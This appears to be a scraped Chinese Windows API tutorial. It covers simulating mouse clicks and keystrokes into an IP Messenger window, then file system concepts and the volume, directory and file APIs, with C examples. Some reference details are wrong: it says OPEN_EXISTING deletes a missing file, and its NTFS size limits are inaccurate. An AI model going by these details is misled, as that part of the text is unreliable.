用GetWindowRect获取Button按钮窗口的坐标，这个坐标是按钮相对于整个桌面的左边 用SetCursorPos设置鼠标的位置，x和y都+10（估算的），因为鼠标放刷新按钮左上角是无法点击的 用mouse_event模拟鼠标左键按下和松开操作，实现点击按钮的效果 msdn上说mouse_event函数被取代，现在建议用SendInput函数 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#pragma comment(linker,&quot;/subsystem:\\&quot;windows\\&quot; /entry:\\&quot;mainCRTStartup\\&quot;&quot; ) int main()&#123; // 父窗口类名和标题 const char* className = &quot;#32770&quot;; const char* windowTitle = &quot;飞鸽传书 IP Messenger&quot;; // 查找父窗口 HWND hwndParent = FindWindowA(className, windowTitle); if (hwndParent == NULL) &#123; printf(&quot;未找到父窗口 &quot;); return 1; &#125; // 查找刷新按钮子控件 HWND hButton = FindWindowExA(hwndParent, NULL, &quot;Button&quot;, &quot;刷新(&amp;R)&quot;); if (hButton == NULL) &#123; printf(&quot;未找到刷新按钮 &quot;); return 1; &#125; // 获取按钮窗口的坐标 RECT r; GetWindowRect(hButton, &amp;r); printf(&quot;刷新按钮坐标: %d, %d &quot;, r.left, r.top); // 设置鼠标的位置 SetCursorPos(r.left + 10, r.top + 10); Sleep(2000); // 模拟鼠标左键单击 mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0); // 点下左键 mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0); // 松开左键 return 0;&#125; 执行后鼠标被移动到刷新按钮那，并点击了 1#pragma comment(linker,&quot;/subsystem:\\&quot;windows\\&quot; /entry:\\&quot;mainCRTStartup\\&quot;&quot; ) 上面这句式用来隐藏cmd窗口，方便观察。（因为子系统被设置为 windows，所以程序不会显示控制台窗口，即使程序的入口点是 main 而不是 WinMain） 如果想点击的区域不是一个控件，而是画出来的区域，如下图所示。我们可以找到离这块区域最近的一个子控件，然后加偏移让鼠标移过去 模拟键盘 找fg主窗口，得到Edit控件句柄，将鼠标稍微移移动，模拟左键点击，模拟键盘输入 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;windows.h&gt;#include &lt;stdio.h&gt;//#pragma comment(linker, &quot;/subsystem:\\&quot;windows\\&quot; /entry:\\&quot;mainCRTStartup\\&quot;&quot;)int main()&#123; // 父窗口类名和标题 const char* className = &quot;#32770&quot;; const char* windowTitle = &quot;飞鸽传书 IP Messenger&quot;; // 查找父窗口 HWND hwndParent = FindWindowA(className, windowTitle); if (hwndParent == NULL) &#123; printf(&quot;未找到父窗口 &quot;); return 1; &#125; // 查找编辑框子控件 HWND hEdit = GetDlgItem(hwndParent, 0x3E9); if (hEdit == NULL) &#123; printf(&quot;未找到编辑框 &quot;); return 1; &#125; // 获取编辑框窗口的坐标 RECT r; GetWindowRect(hEdit, &amp;r); printf(&quot;编辑框坐标: %d, %d &quot;, r.left, r.top); // 设置鼠标的位置 SetCursorPos(r.left + 10, r.top + 10); Sleep(1000); // 模拟鼠标左键单击a mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0); // 点下左键 mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0); // 松开左键 // 模拟键盘输入 &#x27;a&#x27; keybd_event(0x41, 0, 0, 0); // 按下 &#x27;a&#x27; 键 keybd_event(0x41, 0, KEYEVENTF_KEYUP, 0); // 松开 &#x27;a&#x27; 键 Sleep(1000); // 模拟键盘输入 &#x27;b&#x27; keybd_event(0x42, 0, 0, 0); // 按下 &#x27;b&#x27; 键 keybd_event(0x42, 0, KEYEVENTF_KEYUP, 0); // 松开 &#x27;b&#x27; 键 Sleep(1000); // 模拟键盘输入 &#x27;C&#x27; (Shift + &#x27;c&#x27;) keybd_event(VK_SHIFT, 0, 0, 0); // 按下 Shift 键 keybd_event(0x43, 0, 0, 0); // 按下 &#x27;c&#x27; 键 keybd_event(0x43, 0, KEYEVENTF_KEYUP, 0); // 松开 &#x27;c&#x27; 键 keybd_event(VK_SHIFT, 0, KEYEVENTF_KEYUP, 0); // 松开 Shift 键 return 0;&#125; 运行后，会在编译框中输入三个字母 综合练习 使用CreateProcess创建fg进程，路径在E:\\temp\\ipmsg.exe，slepp睡眠等待一会 遍历所有打开的窗口，如果找到了fg，就停止遍历 将fg显示出来，设置鼠标在编辑框的位置左键点击，然后模拟键盘输入 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104#include &lt;windows.h&gt;#include &lt;stdio.h&gt;// 回调函数，用于枚举顶层窗口BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)&#123; char windowText[256]; GetWindowTextA(hwnd, windowText, sizeof(windowText)); // 比较窗口标题 if (strcmp(windowText, &quot;飞鸽传书 IP Messenger&quot;) == 0) &#123; HWND* phwnd = (HWND*)lParam; *phwnd = hwnd; return FALSE; // 返回 FALSE 停止枚举 &#125; return TRUE; // 返回 TRUE 继续枚举&#125;int main()&#123; //// 进程信息结构 //STARTUPINFO si = &#123; 0 &#125;; //si.cb = sizeof(si); //PROCESS_INFORMATION pi = &#123; 0 &#125;; //// 创建fg进程 //if (!CreateProcess(&quot;E:\\\\temp\\\\ipmsg.exe&quot;, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi)) //&#123; // printf(&quot;创建进程失败 &quot;); // return 1; //&#125; //// 等一会 //Sleep(10000); // 枚举所有顶层窗口，查找fg窗口 HWND hwndFg = NULL; EnumWindows(EnumWindowsProc, (LPARAM)&amp;hwndFg); if (hwndFg == NULL) &#123; printf(&quot;未找到fg窗口 &quot;); return 1; &#125; // 将fg窗口显示并置顶 ShowWindow(hwndFg, SW_SHOW); SetForegroundWindow(hwndFg); // 查找编辑框子控件 HWND hEdit = GetDlgItem(hwndFg, 0x3E9); if (hEdit == NULL) &#123; printf(&quot;未找到编辑框 &quot;); return 1; &#125; // 获取编辑框窗口的坐标 RECT r; GetWindowRect(hEdit, &amp;r); printf(&quot;编辑框坐标: %d, %d &quot;, r.left, r.top); // 设置鼠标的位置 SetCursorPos(r.left + 1, r.top + 1); Sleep(1000); // 模拟鼠标左键单击 INPUT inputs[2] = &#123;&#125;; inputs[0].type = INPUT_MOUSE; inputs[0].mi.dwFlags = MOUSEEVENTF_LEFTDOWN; inputs[1].type = INPUT_MOUSE; inputs[1].mi.dwFlags = MOUSEEVENTF_LEFTUP; SendInput(ARRAYSIZE(inputs), inputs, sizeof(INPUT)); // 模拟键盘输入 &#x27;a&#x27; INPUT keyInputs[2] = &#123;&#125;; keyInputs[0].type = INPUT_KEYBOARD; keyInputs[0].ki.wVk = &#x27;A&#x27;; keyInputs[1].type = INPUT_KEYBOARD; keyInputs[1].ki.wVk = &#x27;A&#x27;; keyInputs[1].ki.dwFlags = KEYEVENTF_KEYUP; SendInput(ARRAYSIZE(keyInputs), keyInputs, sizeof(INPUT)); Sleep(1000); // 模拟键盘输入 &#x27;b&#x27; keyInputs[0].ki.wVk = &#x27;B&#x27;; keyInputs[1].ki.wVk = &#x27;B&#x27;; SendInput(ARRAYSIZE(keyInputs), keyInputs, sizeof(INPUT)); Sleep(1000); // 模拟键盘输入 &#x27;C&#x27; (Shift + &#x27;c&#x27;) keyInputs[0].ki.wVk = VK_SHIFT; keyInputs[0].ki.dwFlags = 0; keyInputs[1].ki.wVk = VK_SHIFT; keyInputs[1].ki.dwFlags = KEYEVENTF_KEYUP; SendInput(ARRAYSIZE(keyInputs), keyInputs, sizeof(INPUT)); keyInputs[0].ki.wVk = &#x27;C&#x27;; keyInputs[0].ki.dwFlags = 0; keyInputs[1].ki.wVk = &#x27;C&#x27;; keyInputs[1].ki.dwFlags = KEYEVENTF_KEYUP; SendInput(ARRAYSIZE(keyInputs), keyInputs, sizeof(INPUT)); return 0;&#125; 不过fg这个有点问题，就是fg一启动是最小化，遍历窗口会找不到。只有点出来显示过一次，用FindWindow才能找到这个窗口。"},{"title":"文件系统","path":"/wiki/Windows_API/文件系统.html","content":"文件系统 硬盘是存储介质，文件系统是操作系统用于组织和管理存储介质上数据的方法和数据结构，简单点说就是在磁盘上如何组织文件的方法。文件系统是软件层面上的概念。 Windows从诞生到现在，其文件系统已经经历几次重大的升级。从最开始的FAT16到FAT32文件系统到目前在Windows 2000和 Windows XP以及Windows Vista均采用的NTFS文件系统。 NTFS和FAT32的部分区别如下表： NTFS FAT32 磁盘分区容量 2T(2048G) 32G 单个文件容量 4G以上 最大4G EFS加密 支持 不支持 磁盘配额 支持 不支持 磁盘分区容量 NTFS文件系统的磁盘分区容量能达到2T(2048G)；FAT32文件系统的磁盘分区容量能达到32G 单个文件容量 NTFS文件系统中的文件能达到4G以上，而FAT32文件系统中的文件最大只能4G。 EFS加密 磁盘配额 查看某个盘所使用的文件系统： EFS加密磁盘配额打勾后，注销当前用户，切换到别的用户，别的用户访问该文件会拒绝访问 配置某个用户使用该磁盘的额度，比如限制test用户使用C盘只能使用1GB的额度 FAT32，NTFS文件系统的实现细节并未公开，但无论系统用的是哪种文件系统，微软提供的API都屏蔽了这些底层的实现细节，对用户来说是透明的，开发人员无论在哪种文件系统，调用的API都是同一套。 文件系统中最上层的组织结构是卷，然后下一层是目录（目录中之下可以还是目录，或者是文件），最底层是文件。 物理硬盘，磁盘分区，卷，卷标等概念物理硬盘：物理上的硬盘设备，比如在主机中装了一块512G的固态磁盘分区 (Disk Partition)：逻辑分区，比如对上面512的固态进行分区，分成200G，312G两个分区来使用卷 (Volume)：也称逻辑驱动器，是文件系统组织结构的最高层。一个磁盘分区至少含有一个卷，卷也可以存在于多个磁盘分区上，仅存在于一个磁盘分区上的卷称为“简单卷”，仅存在于多个磁盘分区上的卷称为“多分区卷”或“跨区卷”。在最常见的情况下，一个分区只包含一个卷,一个卷也只存在于一个分区上，所以两者容易混淆。卷存在卷标，程序可以通过卷标访问卷。卷标 (Volume Label)：卷的名称。默认情况重命名了磁盘 本小节要讲的就是文件系统中组织结构层级：卷，目录，文件相关的API。 卷相关API 获取卷GetLogicalDrives() 获取主机中所有的卷（逻辑驱动器），以BitMap形式返回 1DWORD GetLogicalDrives(); 返回值DWORD类型，在这个DWORD中，其中每个比特（bit）表示一个驱动器：第0位代表A盘，第1位代表B盘，以此类推。如果某位是1，则表示相应的驱动器存在；如果是0，则表示不存在。 示例12345678910#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int main()&#123; DWORD dwLogicalDrives = GetLogicalDrives(); printf(&quot;%x &quot;, dwLogicalDrives); return 0;&#125;输出12c将c拆开，1100，第2位为1，表示存在C盘驱动器，第3位为1，表示存在D盘驱动器， 获取一个卷的字符串GetLogicalDriveStrings() 获取主机中所有的卷（逻辑驱动器），以驱动器根路径形式字符串返回 1234DWORD GetLogicalDriveStringsW( [in] DWORD nBufferLength, //指定lpBuffer缓冲区的size [out] LPWSTR lpBuffer //out参数，接收结果的缓冲区); 返回值： 成功 缓冲区中就是返回结果的总长度 返回值大于nBufferLength，说明缓冲区长度不够，装不下，那么按nBufferLength的长度返回 失败 返回值为0 示例1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int main()&#123; DWORD dwMaxLength = 100; char szBuffer[100]; GetLogicalDriveStrings(dwMaxLength, szBuffer); // 首先打印所有字符的十六进制形式 printf(&quot;Hex: &quot;); for(int i = 0; szBuffer[i] != &#x27;\\0&#x27; || szBuffer[i-1] != &#x27;\\0&#x27;; i++) &#123; printf(&quot;%02X &quot;, (unsigned char)szBuffer[i]); &#125; printf(&quot; &quot;); // 然后打印所有字符的ASCII形式 printf(&quot;ASCII: &quot;); for(int j = 0; szBuffer[j] != &#x27;\\0&#x27; || szBuffer[j-1] != &#x27;\\0&#x27;; j++) &#123; char c = szBuffer[j]; if (c &gt;= 32 &amp;&amp; c &lt;= 126) &#123; // 可打印字符 printf(&quot;%-3c&quot;, c); &#125; else &#123; // 不可打印字符（如空字符）用点（.）表示 printf(&quot;%-3c&quot;, &#x27;.&#x27;); &#125; &#125; printf(&quot; &quot;); // 遍历szBuffer以打印所有驱动器名称 for(char *pDrive = szBuffer; *pDrive != &#x27;\\0&#x27;; pDrive += strlen(pDrive) + 1) &#123; printf(&quot;%s &quot;, pDrive); &#125; return 0;&#125;继续遍历szBuffer字符数组的情况：当前字符不为空 或 上一个字符不为空当连续两个字符都为空，就是到结尾了 获取卷的类型GetDriveType() 获取驱动器类型 123UINT GetDriveTypeA([in, optional] LPCSTR lpRootPathName // 驱动器根路径，如&quot;C:\\&quot;); The return value specifies the type of drive, which can be one of the following values. Return code/value Description DRIVE_UNKNOWN0 The drive type cannot be determined. DRIVE_NO_ROOT_DIR1 The root path is invalid; for example, there is no volume mounted at the specified path. DRIVE_REMOVABLE2 The drive has removable media; for example, a floppy drive, thumb drive, or flash card reader. DRIVE_FIXED3 The drive has fixed media; for example, a hard disk drive or flash drive. DRIVE_REMOTE4 The drive is a remote (network) drive. DRIVE_CDROM5 The drive is a CD-ROM drive. DRIVE_RAMDISK6 The drive is a RAM disk. 示例12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int main() &#123; // 检索系统中所有逻辑驱动器的字符串 DWORD dwSize = 100; char szDriveStrings[100]; GetLogicalDriveStrings(dwSize, szDriveStrings); // 遍历每个驱动器 for (char* pDrive = szDriveStrings; *pDrive != &#x27;\\0&#x27;; pDrive += strlen(pDrive) + 1) &#123; printf(&quot;Drive %s - &quot;, pDrive); // 获取驱动器类型 UINT driveType = GetDriveType(pDrive); // 匹配不同的驱动器类型 switch (driveType) &#123; case DRIVE_UNKNOWN: // 驱动器类型未知 printf(&quot;Type Unknown &quot;); break; case DRIVE_NO_ROOT_DIR: // 驱动器没有根目录 printf(&quot;No Root Directory &quot;); break; case DRIVE_REMOVABLE: // 可移动驱动器（例如USB闪存驱动器或软盘） printf(&quot;Removable Drive &quot;); break; case DRIVE_FIXED: // 固定驱动器（例如硬盘） printf(&quot;Fixed Drive &quot;); break; case DRIVE_REMOTE: // 网络驱动器 printf(&quot;Network Drive &quot;); break; case DRIVE_CDROM: // CD-ROM驱动器 printf(&quot;CD-ROM Drive &quot;); break; case DRIVE_RAMDISK: // RAM盘 printf(&quot;RAM Disk &quot;); break; default: // 未识别的类型 printf(&quot;Type Not Recognized &quot;); break; &#125; &#125; return 0;&#125; 获取卷的详细信息GetVolumeInformation() 获取卷（逻辑驱动器）的详细信息 12345678910BOOL GetVolumeInformationA( [in, optional] LPCSTR lpRootPathName, //所要获取属性的驱动器的根路径字符串，如&quot;C:\\\\&quot;&quot; [out, optional] LPSTR lpVolumeNameBuffer, //返回卷标（驱动器名） [in] DWORD nVolumeNameSize, //lpVolumeNameBuffer缓冲区的大小 [out, optional] LPDWORD lpVolumeSerialNumber, //卷（驱动器）序列号 [out, optional] LPDWORD lpMaximumComponentLength, //文件系统允许的最大文件名长度 [out, optional] LPDWORD lpFileSystemFlags, //驱动器属性值 [out, optional] LPSTR lpFileSystemNameBuffer, //文件系统类型，如“NTFS”，“CDFS”等 [in] DWORD nFileSystemNameSize //lpFileSystemNameBuffer缓冲区的大小); nVolumeNameSize：lpVolumeNameBuffer缓冲区的大小。假设是10，但是要查询的卷的卷标名太长假设为20，那就只返回卷标名的前10个 lpVolumeSerialNumber：卷（驱动器）序列号。 这一项不是硬盘序列号。硬盘序列号是硬盘出厂时生产厂家为区分产品而设置的，无法更改。一些授权软件为了鉴别使用用户的环境，可能会通过硬盘序列号来做限制，当用户换了环境软件就不能用了。一些声称能修改硬盘序列号的工具并不是真正修改了硬盘序列号，而是hook获取的函数，返回另外一个硬盘序列号。 To programmatically obtain the hard disk’s serial number that the manufacturer assigns, use the Windows Management Instrumentation (WMI) Win32_PhysicalMedia property SerialNumber. 一个物理硬盘可能被分成四个卷，那每个卷就有一个卷（驱动器）序列号。如果重装系统，格式化硬盘，这个卷序列号会发生改变。 lpMaximumComponentLength：文件系统允许的最大文件名长度。文件夹，文件名最大的长度是多少 lpFileSystemFlags：驱动器属性值。 A pointer to a variable that receives flags associated with the specified file system. This parameter can be one or more of the following flags. However, FILE_FILE_COMPRESSION and FILE_VOL_IS_COMPRESSED are mutually exclusive. FILE_VOLUME_QUOTAS表示支持磁盘配额 FILE_SUPPORTS_ENCRYPTION表示文件系统是否支持EFS加密等。 示例123456789101112131415161718192021222324252627282930313233343536373839#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int main() &#123; // 定义变量以存储卷信息 TCHAR volumeName[MAX_PATH + 1] = &#123; 0 &#125;; DWORD volumeSerialNumber = 0; DWORD maximumComponentLength = 0; DWORD fileSystemFlags = 0; TCHAR fileSystemName[MAX_PATH + 1] = &#123; 0 &#125;; // 获取C盘的卷信息 BOOL success = GetVolumeInformation( &quot;C:\\\\&quot;, // 驱动器根路径 volumeName, // 卷标 MAX_PATH, // 卷标缓冲区的大小 &amp;volumeSerialNumber, // 卷序列号 &amp;maximumComponentLength, // 最大文件名长度 &amp;fileSystemFlags, // 文件系统标志 fileSystemName, // 文件系统名称 MAX_PATH // 文件系统名称缓冲区的大小 ); if (success) &#123; printf(&quot;Volume Name: %s &quot;, volumeName); printf(&quot;Volume Serial Number: %lu &quot;, volumeSerialNumber); printf(&quot;Maximum Component Length: %lu &quot;, maximumComponentLength); printf(&quot;File System Flags: %lu &quot;, fileSystemFlags); printf(&quot;File System Name: %s &quot;, fileSystemName); &#125; else &#123; printf(&quot;Error retrieving volume information &quot;); &#125; return 0;&#125; 目录相关API 创建目录CreateDirectory() 1234BOOL CreateDirectory( [in] LPCSTR lpPathName, //创建的目录的名字 [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes //SD 安全描述符); Directory也是一个内核对象，有LPSECURITY_ATTRIBUTES类型的参数 示例12345678#include &lt;Windows.h&gt;int main()&#123; CreateDirectory(&quot;C:\\\\A&quot;, NULL); return 0;&#125;运行后在C盘下创建名为A的目录 删除目录RemoveDirectory() Deletes an existing empty directory. 123BOOL RemoveDirectoryA( [in] LPCSTR lpPathName //要删除的目录的名字); 示例12345678#include &lt;Windows.h&gt;int main()&#123; RemoveDirectory(&quot;C:\\\\A&quot;); return 0;&#125;运行后在C盘下名为A的目录被删除 修改目录名称MoveFile() 1234BOOL MoveFile( [in] LPCTSTR lpExistingFileName, //当前目录/文件的名字 [in] LPCTSTR lpNewFileName //要修改成的新名字); 示例12345678#include &lt;Windows.h&gt;int main()&#123; MoveFile(&quot;C:\\\\B&quot;, &quot;C:\\\\C&quot;); return 0;&#125;运行后在C盘下名为B的目录被改名为C 获取当前进程的目录GetCurrentDirectory() 1234DWORD GetCurrentDirectory( [in] DWORD nBufferLength, //lpBuffer字符串缓冲区的大小 [out] LPTSTR lpBuffer //存获取的字符串); GetCurrentDirectory 函数获取程序的当前工作目录，即程序运行时的活动目录。这个目录可以与模块所在的目录不同，取决于CreateProcess时lpCurrentDirectory参数的设置 用途，比如CreateDirectory或CreateFile时，未使用绝对路径，寻找的路径就是进程的当前工作目录 1CreateDirectory(&quot;C:\\\\A&quot;, NULL); //绝对路径 1CreateDirectory(&quot;A&quot;, NULL); //在进程的当前工作目录下创建A文件夹 设置当前进程的目录SetCurrentDirectory() Sets the application’s current working directory to the specified directory. 123BOOL SetCurrentDirectory( [in] LPCTSTR lpPathName); 示例这个程序首先调用 GetCurrentDirectory 来获取并打印当前进程的工作目录。接着，它调用 CreateDirectory 在当前目录下创建一个新文件夹“A”。然后，程序使用 SetCurrentDirectory 将工作目录更改为 C:\\，并再次尝试在那里创建一个名为“A”的文件夹。123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int main() &#123; char currentDirectory[MAX_PATH]; BOOL result; // 获取当前进程的工作目录 if (!GetCurrentDirectory(MAX_PATH, currentDirectory)) &#123; printf(&quot;Error getting current directory &quot;); return 1; &#125; printf(&quot;Current Directory: %s &quot;, currentDirectory); // 在当前目录下创建新文件夹 &quot;A&quot; result = CreateDirectory(&quot;A&quot;, NULL); if (result) &#123; printf(&quot;Directory &#x27;A&#x27; created in current directory &quot;); &#125; else &#123; printf(&quot;Error creating directory &#x27;A&#x27; in current directory &quot;); &#125; // 更改当前工作目录到 C:\\ result = SetCurrentDirectory(&quot;C:\\\\&quot;); if (!result) &#123; printf(&quot;Error setting current directory to C:\\\\ &quot;); return 1; &#125; printf(&quot;Current Directory changed to C:\\\\ &quot;); // 在C:\\\\创建新文件夹 &quot;A&quot; result = CreateDirectory(&quot;C:\\\\A&quot;, NULL); if (result) &#123; printf(&quot;Directory &#x27;A&#x27; created in C:\\\\ &quot;); &#125; else &#123; printf(&quot;Error creating directory &#x27;A&#x27; in C:\\\\ &quot;); &#125; return 0;&#125;输出1234Current Directory: C:\\Program Files\\Microsoft Visual Studio\\MyProjects\\DemoDirectory &#x27;A&#x27; created in current directoryCurrent Directory changed to C:\\Directory &#x27;A&#x27; created in C:\\ 文件相关API 在文件操作中，文件句柄惟一标识了一个文件，ReadFile、WriteFile、GetFileSize等函数都需要文件句柄作为参数。在对文件进行操作之前，都必须要使用CreateFile获取文件句柄 创建文件CreateFile() 创建或打开一个现有的文件，得到这个文件的文件句柄 123456789HANDLE CreateFileA( [in] LPCSTR lpFileName, //文件名 [in] DWORD dwDesiredAccess, //访问模式 [in] DWORD dwShareMode, //共享模式 [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes, //SD 安全描述符 [in] DWORD dwCreationDisposition, //创建方式 [in] DWORD dwFlagsAndAttributes, //文件属性和文件标志 [in, optional] HANDLE hTemplateFile //模板文件 不用管，填空); dwDesiredAccess：只读权限打开？可写权限打开？还是所有权限？The most commonly used values are GENERIC_READ, GENERIC_WRITE, or both (GENERIC_READ | GENERIC_WRITE). Constant Generic meaning GENERIC_ALL 0x10000000 All possible access rights GENERIC_EXECUTE 0x20000000 Execute access GENERIC_WRITE 0x40000000 Write access GENERIC_READ 0x80000000 Read access Generic Access Rights dwShareMode：共享模式，通常没什么用。 指明与其他进程是否共享该文件，可以是共享读(FILE_SHARE_READ)、共享写(FILE_SHARE_WRITE）、共享删除(FILE_SHARE_DELETE)。如果要指明多个属性，使用“位与”“|”运算。如果指明上述参数，其他进程就可以对文件进行相关操作。 如果本进程需要独占本文件，则将本参数设置为0。 If this parameter is zero and CreateFile succeeds, the file or device cannot be shared and cannot be opened again until the handle to the file or device is closed. For more information, see the Remarks section. dwCreationDisposition：操作模式 操作模式 意义 CREATE_ALWAYS 如果指向的文件存在，则overwrite该文件，清除文件内容，清除文件属性;如果文件不存在，则新建一个文件 CREATE_NEW 新建文件，如果文件已经存在，则返回失败 OPEN_ALWAYS 如果文件存在，则打开文件;如果文件不存在，则等同于CREATE_NEW OPEN_EXISTING 打开存在的文件，如果文件不存在，则删除文件 TRUNCATE_EXISTING 打开已经存在的文件，并把内容清空，文件大小变为零 dwFlagsAndAttributes： 文件属性 意义 FILE_ATTRIBUTE_ARCHIVE 存档文件 FILE_ATTRIBUTE_ENCRYPTED 加密文件 FILE_ATTRIBUTE_HIDDEN 隐藏文件 FILE_ATTRIBUTE_NORMAL 不含有其他文件属性，只能单独使用 FILE_ATTRIBUTE_NOT_CONTENT_INDEXED 没有使用内容索引服务 FILE_ATTRIBUTE_OFFLINE 离线存储文件 FILE_ATTRIBUTE_READONLY 只读文件 FILE_ATTRIBUTE_SYSTEM 系统文件 FILE_ATTRIBUTE_TEMPORARY 临时文件 操作标志 意义 FILE_FLAG_BACKUP_SEMANTICS 打开和创建文件是为了进行备份和恢复操作 FILE_FLAG_DELETE_ON_CLOSE 如果文件句柄全部关闭，则删除文件 FILE_FLAG_NO_BUFFERING 不使用系统缓存(caching，不同于硬件缓存) FILE_FLAG_OPEN_NO_RECALL 远程存储 FILE_FLAG_OPEN_REPARSE_POINT 系统将禁止NTFS文件系统的“再解析”行为 FILE_FLAG_OVERLAPPED 以异步IO方式创建可打开文件 FILE_FLAG_POSIX_SEMANTICS 按照POSIX规则存取 FILE_FLAG_RANDOM_ACCESS 随机存取 FILE_FLAG_SEQUENTIAL_SCAN 文件从头到尾是连续的(sequentially) FILE_FLAG_WRITE_THROUGH 存取文件时，对磁盘进行直接的操作，不经过缓存 一般情况下文件属性较常用，而操作标志不常用，可以使用“|”运算符指定多个属性和标志。 示例123456789101112131415161718#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int main() &#123; // 创建文件 CreateFile( TEXT(&quot;C:\\\\A.txt&quot;), // 文件名: 指定要创建或打开的文件的名称。 GENERIC_READ | GENERIC_WRITE, // 访问模式: 指定对文件的读写权限。 0, // 共享模式: 指定其他进程是否可以共享此文件，0表示不共享。 NULL, // 安全属性: 指定安全描述符，NULL表示默认安全级别。 CREATE_ALWAYS, // 创建方式: 指定如何创建或打开文件，这里为总是创建。 FILE_ATTRIBUTE_HIDDEN, // 文件属性: 设置文件的属性，这里为隐藏文件。 NULL // 模板文件: 用于指定文件的属性和扩展属性的文件的句柄，NULL表示不使用模板。 ); return 0;&#125;运行后C盘下多出一个A.txt文件，该文件为隐藏文件 关闭文件CloseHandle() 1 示例 获取文件长度GetFileSize() 1234DWORD GetFileSize( //返回值是返回文件大小结果的低32位 [in] HANDLE hFile, //文件句柄 [out, optional] LPDWORD lpFileSizeHigh //返回文件大小结果的高32位，填NULL表示不需要高32位); GetFileSize的返回值是文件大小结果的低32位，lpFileSizeHigh是文件大小结果的高32位 示例12345678910111213141516171819202122232425262728293031323334#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int main() &#123; // 打开文件 HANDLE hFile = CreateFile( TEXT(&quot;C:\\\\Windows\\\\System32\\ otepad.exe&quot;), // 文件名 GENERIC_READ, // 访问模式: 只读 FILE_SHARE_READ, // 共享模式: 允许其他进程读取文件 NULL, // 安全属性: 默认 OPEN_EXISTING, // 打开现有文件 FILE_ATTRIBUTE_NORMAL, // 文件属性: 普通文件 NULL // 没有模板文件 ); if (hFile == INVALID_HANDLE_VALUE) &#123; printf(&quot;Failed to open file &quot;); return 1; &#125; // 获取文件大小 DWORD fileSize = GetFileSize(hFile, NULL); if (fileSize == INVALID_FILE_SIZE) &#123; printf(&quot;Failed to get file size &quot;); CloseHandle(hFile); return 1; &#125; printf(&quot;File size: %lu bytes &quot;, fileSize); // 关闭文件句柄 CloseHandle(hFile); return 0;&#125; 获取文件属性和信息GetFileAttributes()/GetFileAttributesEx() 123DWORD GetFileAttributesA( [in] LPCSTR lpFileName); 获取文件或目录的属性、时间、大小，以WIN32_FILE_ATTRIBUTE_DATA结构的形式返回结果，函数原型如下: 12345BOOL GetFileAttributesExA( [in] LPCSTR lpFileName, [in] GET_FILEEX_INFO_LEVELS fInfoLevelId, [out] LPVOID lpFileInformation); lpFileName：输入参数，为需要获取属性的文件或目录。 fInfoLevelld：输入参数，是获取文件属性信息的类别,会影响到lpFileInformation参数具体采用什么形式输出结果。但是本参数一般只能指定为GetFileExInfoStandard。 lpFileInformation：输入参数，用于返回结果。如果flnfoLevelld参数指定为GetFileExInfoStandard，则为LPWIN32_FILE_ATTRIBUTE_DATA类型。 WIN32_FILE_ATTRIBUTE_DATA structure 12345678typedef struct _WIN32_FILE_ATTRIBUTE_DATA &#123; DWORD dwFileAttributes; //文件属性 FILETIME ftCreationTime; //文件创建时间 FILETIME ftLastAccessTime; //文件最后访问时间 FILETIME ftLastWriteTime; //文件最后写入时间 DWORD nFileSizeHigh; //文件大小，高32位 DWORD nFileSizeLow; //文件大小，低32位&#125; WIN32_FILE_ATTRIBUTE_DATA, *LPWIN32_FILE_ATTRIBUTE_DATA; dwFileAttributes：位掩码。详细查File Attribute Constants FILETIME和SYSTEMTIME结构体FILETIME结构体此结构用最小的数据量表示的时间，但是不便于用户查看和显示。通过API 获取的系统时间都是这种格式的。如果要使用显示，可以使用FileTimeToSystemTime转换为便于显示的SYSTEMTIME结构。1234typedef struct _FILETIME &#123; DWORD dwLowDateTime; DWORD dwHighDateTime;&#125; FILETIME, *PFILETIME, *LPFILETIME;SYSTEMTIME结构体此结构使用了较为直观的方式表示时间12345678910typedef struct _SYSTEMTIME &#123; WORD wYear; WORD wMonth; WORD wDayOfWeek; WORD wDay; WORD wHour; WORD wMinute; WORD wSecond; WORD wMilliseconds;&#125; SYSTEMTIME, *PSYSTEMTIME, *LPSYSTEMTIME; 示例12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int main() &#123; // 声明WIN32_FILE_ATTRIBUTE_DATA结构体并初始化 WIN32_FILE_ATTRIBUTE_DATA data = &#123; 0 &#125;; // 获取notepad.exe的文件属性 BOOL success = GetFileAttributesEx( &quot;C:\\\\Windows\\\\System32\\ otepad.exe&quot;, // 指定文件路径 GetFileExInfoStandard, // 要检索的信息级别 &amp;data // 接收文件属性数据的缓冲区 ); if (!success) &#123; printf(&quot;获取文件属性失败。 &quot;); return 1; &#125; // 打印文件属性 printf(&quot;属性：%d &quot;, data.dwFileAttributes); // 文件属性的位掩码 // 打印文件大小的高位DWORD printf(&quot;大小高位：%lu &quot;, data.nFileSizeHigh); // 文件大小的高位部分 // 打印文件大小的低位DWORD printf(&quot;大小低位：%lu &quot;, data.nFileSizeLow); // 文件大小的低位部分 // 打印文件创建时间 printf(&quot;创建时间：%llx &quot;, data.ftCreationTime); // 文件创建时间 // 打印文件最后访问时间 printf(&quot;最后访问时间：%llx &quot;, data.ftLastAccessTime); // 文件最后访问时间 // 打印文件最后写入时间 printf(&quot;最后写入时间：%llx &quot;, data.ftLastWriteTime); // 文件最后写入时间 return 0;&#125; 